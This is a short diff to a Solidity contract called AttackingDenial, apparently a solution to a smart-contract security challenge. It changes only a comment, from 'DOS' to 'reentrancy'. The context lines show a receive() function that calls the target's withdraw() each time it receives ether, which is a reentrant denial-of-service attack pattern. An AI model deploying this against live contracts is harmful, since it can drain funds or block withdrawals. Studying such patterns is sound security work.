@@ -9,8 +9,8 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    /* Combine the vulnerability of 'call' in Denial.withdraw(), 
-    with DOS...? */
+    /* Combine the vulnerability of 'call' in denial.withdraw(), 
+    with reentrancy? */
     receive() external payable {
         contractAddress.call(abi.encodeWithSignature("withdraw()"));
     }
